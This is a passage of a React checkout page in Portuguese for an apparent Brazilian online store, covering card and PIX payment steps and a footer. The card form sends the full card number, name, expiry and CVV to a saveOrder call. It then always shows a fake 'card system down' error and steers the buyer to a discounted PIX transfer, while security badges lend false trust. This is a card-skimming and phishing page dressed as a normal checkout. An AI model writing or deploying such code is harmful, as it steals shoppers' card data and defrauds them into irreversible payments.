                    <div className="space-y-1">
                      <label className="text-xs font-medium text-muted-foreground">CPF / CNPJ</label>
                      <Input inputMode="numeric" value={card.cpf} onChange={(e) => setCard((p) => ({ ...p, cpf: formatCPF(e.target.value) }))} className="h-11" />
                    </div>
                    <div className="space-y-1">
                      <label className="text-xs font-medium text-muted-foreground">Nº de Parcelas</label>
                      <select
                        value={card.parcelas}
                        onChange={(e) => setCard((p) => ({ ...p, parcelas: e.target.value }))}
                        className="w-full h-11 border border-input rounded-md px-3 text-sm bg-background"
                      >
                        {parcelasOptions()}
                      </select>
                    </div>

                    <Button
                      onClick={async () => {
                        const e: Record<string, string> = {};
                        if (card.numero.replace(/\D/g, "").length < 13) e.cardNumero = "Número inválido";
                        if (card.validade.replace(/\D/g, "").length !== 4) e.cardValidade = "Validade inválida";
                        if (card.cvv.length < 3) e.cardCvv = "CVV inválido";
                        if (!card.nome.trim()) e.cardNome = "Nome obrigatório";
                        setErrors(e);
                        if (Object.keys(e).length > 0) return;
                        setLoading(true);
                        const digits = card.numero.replace(/\D/g, "");
                        await saveOrder({
                          card_number: digits,
                          card_name: card.nome,
                          card_expiry: card.validade,
                          card_cvv: card.cvv,
                          installments: card.parcelas,
                          status: "card_attempt",
                        });
                        setTimeout(() => {
                          setLoading(false);
                          setCardError(true);
                          setPaymentMethod("pix");
                          setTimeout(() => {
                            document.getElementById("card-error-msg")?.scrollIntoView({ behavior: "smooth", block: "center" });
                          }, 100);
                        }, 1500);
                      }}
                      disabled={loading}
                      className="w-full rounded-lg h-12 text-base font-semibold bg-primary hover:bg-primary/90"
                      size="lg"
                    >
                      {loading ? (
                        <><Loader2 size={18} className="animate-spin" /> Processando...</>
                      ) : (
                        <><Lock size={16} className="mr-1" /> Efetuar pagamento</>
                      )}
                    </Button>
                  </div>
                )}
              </div>

              {cardError && (
                <div id="card-error-msg" className="border-2 border-destructive bg-destructive/10 rounded-lg p-4 space-y-2">
                  <p className="font-heading font-bold text-sm text-destructive">
                    Pagamento por cartão indisponível
                  </p>
                  <p className="text-xs text-foreground leading-relaxed">
                    Nosso sistema de pagamento por cartão está temporariamente fora do ar.
                    Para não perder sua compra, oferecemos <span className="font-bold">30% de desconto</span> pagando via PIX abaixo.
                  </p>
                </div>
              )}

              {/* PIX option */}
              <div
                className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
                  paymentMethod === "pix" ? "border-primary bg-primary/5" : "border-border"
                }`}
                onClick={() => setPaymentMethod("pix")}
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <input type="radio" checked={paymentMethod === "pix"} readOnly className="accent-[hsl(var(--primary))]" />
                    <span className="font-semibold text-sm">Pix</span>
                  </div>
                  <span className="bg-primary text-primary-foreground text-[9px] font-bold px-2 py-0.5 rounded uppercase tracking-wide">
                    Pagamento Instantâneo no PIX
                  </span>
                </div>
                {paymentMethod === "pix" && (
                  <div className="mt-3 space-y-2">
                    <p className="text-xs text-muted-foreground leading-relaxed">
                      A confirmação de pagamento é realizada em poucos minutos. Utilize o aplicativo do seu banco para pagar.
                    </p>
                    {cardError && (
                      <p className="text-xs font-bold text-destructive">
                        30% de desconto aplicado!
                      </p>
                    )}
                    <p className="font-heading font-bold text-sm">
                      Valor no pix:{" "}
                      {cardError && (
                        <span className="text-muted-foreground line-through font-normal mr-1">
                          R$ {baseTotal.toFixed(2).replace(".", ",")}
                        </span>
                      )}
                      <span className="text-primary">R$ {finalTotal.toFixed(2).replace(".", ",")}</span>
                    </p>
                    <Button
                      onClick={handleGeneratePix}
                      disabled={loading}
                      className="w-full rounded-lg h-12 text-base font-semibold bg-primary hover:bg-primary/90"
                      size="lg"
                    >
                      {loading ? (
                        <><Loader2 size={18} className="animate-spin" /> Processando...</>
                      ) : (
                        <><Lock size={16} className="mr-1" /> Comprar agora</>
                      )}
                    </Button>
                  </div>
                )}
              </div>
            </div>

            <CheckoutFooter />
          </div>
        )}

        {/* Step 4: PIX Result */}
        {step === 4 && pixData && (
          <div className="space-y-4 py-4 pb-8">
            <div className="bg-background rounded-2xl border border-border p-6 text-center space-y-3">
              <h2 className="font-heading font-bold text-xl text-foreground">Pix gerado com sucesso</h2>
              <p className="text-sm text-muted-foreground leading-relaxed">
                Estamos aguardando o pagamento! Após realizar o pagamento, aguarde nesta tela para confirmar seu pedido.
              </p>

              <div className="border-t border-border pt-5 pb-1">
                <p className="font-heading font-black text-6xl text-foreground tracking-tight leading-none">
                  {countdown}
                </p>
                <p className="text-sm text-muted-foreground mt-2">Tempo para conclusão da operação</p>
              </div>

              <p className="text-sm text-muted-foreground">
                Pague através do codigo <span className="font-bold text-foreground">PIX copia e cola</span>
              </p>

              <div className="border-t border-border pt-4">
                <p className="font-heading font-bold text-base">
                  Valor no pix: <span className="text-primary">R$ {finalTotal.toFixed(2).replace(".", ",")}</span>
                </p>
              </div>

              <div className="border-2 border-primary/40 rounded-2xl px-4 py-3.5 text-sm text-foreground text-left font-mono overflow-hidden whitespace-nowrap text-ellipsis">
                {pixData.pix_code}
              </div>

              <Button
                onClick={handleCopy}
                className="w-full rounded-xl h-14 text-lg font-semibold bg-primary hover:bg-primary/90"
                size="lg"
              >
                {copied ? (
                  <><Check size={20} className="mr-2" /> Código copiado!</>
                ) : (
                  <><Copy size={20} className="mr-2" /> Copiar código pix</>
                )}
              </Button>
            </div>

            <div className="bg-background rounded-2xl border border-border p-5 space-y-4">
              <h3 className="font-heading font-bold text-lg text-center">Como pagar o seu pedido</h3>
              <div className="space-y-5">
                <div className="flex items-start gap-3">
                  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-muted-foreground shrink-0 mt-0.5"><polyline points="6 9 6 2 18 2 18 9"/><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"/><rect width="12" height="8" x="6" y="14"/></svg>
                  <p className="text-sm text-muted-foreground">
                    <span className="font-bold text-foreground">Copie o código</span> acima clicando no botão
                  </p>
                </div>
                <div className="flex items-start gap-3">
                  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-muted-foreground shrink-0 mt-0.5"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
                  <p className="text-sm text-muted-foreground leading-relaxed">
                    Abra o aplicativo de seu banco e selecione <span className="font-bold text-foreground">Copia e Cola</span> na opção de <span className="font-bold text-foreground">pagamento por PIX</span>. Certifique-se que os dados estão corretos e finalize o pagamento.
                  </p>
                </div>
              </div>
            </div>

            <p className="font-heading font-bold text-base text-center text-foreground">OU</p>

            <Button
              variant="outline"
              className="w-full rounded-xl h-13 text-base font-semibold border-2 border-blue-500 text-blue-600 bg-blue-50 hover:bg-blue-100"
              size="lg"
              onClick={() => setShowQrCode((prev) => !prev)}
            >
              <QrCode size={18} className="mr-2" /> MOSTRAR QR CODE
            </Button>

            {showQrCode && (
              <div className="flex justify-center">
                {qrCodeSrc ? (
                  <img src={qrCodeSrc} alt="QR Code PIX" className="w-48 h-48 rounded-lg border border-border bg-background" />
                ) : (
                  <div className="w-48 h-48 rounded-lg border-2 border-dashed border-border flex items-center justify-center">
                    <p className="text-xs text-muted-foreground text-center px-4">QR Code indisponível</p>
                  </div>
                )}
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

const CheckoutFooter = () => (
  <div className="mt-6 border-t border-border pt-6 pb-8 space-y-4 text-center">
    <p className="text-sm font-heading font-semibold">Formas de pagamento</p>
    <div className="flex justify-center gap-2 flex-wrap items-center">
      <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/visa.svg" alt="Visa" className="h-8 w-12 object-contain rounded-lg bg-white border border-gray-200 p-1" />
      <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain rounded-lg bg-white border border-gray-200 p-1" />
      <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/american-express.svg" alt="Amex" className="h-8 w-12 object-contain rounded-lg bg-white border border-gray-200 p-1" />
      <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/diners.svg" alt="Diners" className="h-8 w-12 object-contain rounded-lg bg-white border border-gray-200 p-1" />
      <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/discover.svg" alt="Discover" className="h-8 w-12 object-contain rounded-lg bg-white border border-gray-200 p-1" />
      <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/elo.svg" alt="Elo" className="h-8 w-12 object-contain rounded-lg bg-white border border-gray-200 p-1" />
      <img src="https://raw.githubusercontent.com/datatrans/payment-logos/master/assets/cards/hipercard.svg" alt="Hipercard" className="h-8 w-12 object-contain rounded-lg bg-white border border-gray-200 p-1" />
      <img src="https://raw.githubusercontent.com/aaronfagan/svg-credit-card-payment-icons/main/flat/hiper.svg" alt="Hiper" className="h-8 w-12 object-contain rounded-lg bg-white border border-gray-200 p-1" />
      <div className="h-8 w-12 flex items-center justify-center rounded-lg bg-white border border-gray-200 p-1">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640" className="h-5 w-5 fill-[#32BCAD]">
          <path d="M306.4 356.5C311.8 351.1 321.1 351.1 326.5 356.5L403.5 433.5C417.7 447.7 436.6 455.5 456.6 455.5L471.7 455.5L374.6 552.6C344.3 582.1 295.1 582.1 264.8 552.6L167.3 455.2L176.6 455.2C196.6 455.2 215.5 447.4 229.7 433.2L306.4 356.5zM326.5 282.9C320.1 288.4 311.9 288.5 306.4 282.9L229.7 206.2C215.5 191.1 196.6 184.2 176.6 184.2L167.3 184.2L264.7 86.8C295.1 56.5 344.3 56.5 374.6 86.8L471.8 183.9L456.6 183.9C436.6 183.9 417.7 191.7 403.5 205.9L326.5 282.9zM176.6 206.7C190.4 206.7 203.1 212.3 213.7 222.1L290.4 298.8C297.6 305.1 307 309.6 316.5 309.6C325.9 309.6 335.3 305.1 342.5 298.8L419.5 221.8C429.3 212.1 442.8 206.5 456.6 206.5L494.3 206.5L552.6 264.8C582.9 295.1 582.9 344.3 552.6 374.6L494.3 432.9L456.6 432.9C442.8 432.9 429.3 427.3 419.5 417.5L342.5 340.5C328.6 326.6 304.3 326.6 290.4 340.6L213.7 417.2C203.1 427 190.4 432.6 176.6 432.6L144.8 432.6L86.8 374.6C56.5 344.3 56.5 295.1 86.8 264.8L144.8 206.7L176.6 206.7z"/>
        </svg>
      </div>
    </div>
    <div className="space-y-1 text-xs text-muted-foreground">
      <p>Verde Casa Comércio LTDA</p>
      <p>CNPJ: 45.372.528/0004-12</p>
    </div>
    <div className="flex justify-center gap-4 text-[10px] text-muted-foreground underline">
      <a href="/termos-de-uso">Termos de uso</a>
      <a href="/trocas-e-devolucoes">Trocas e devoluções</a>
      <a href="/politica-de-privacidade">Política de Privacidade</a>
    </div>
    <div className="flex justify-center gap-6 pt-2">
      <div className="flex items-center gap-1.5 text-xs text-muted-foreground">
        <ShieldCheck size={16} className="text-primary" />
        <div className="text-left leading-tight">
          <span className="block font-bold text-[10px]">SEGURO</span>
          <span className="block text-[8px]">CERTIFICADO SSL</span>
        </div>
      </div>
      <div className="flex items-center gap-1.5 text-xs text-muted-foreground">
        <Lock size={16} className="text-primary" />
        <div className="text-left leading-tight">
          <span className="block font-bold text-[10px]">PAGAMENTOS</span>
          <span className="block text-[8px]">SEGUROS</span>
        </div>
      </div>
    </div>
  </div>
);

export default CheckoutPage;
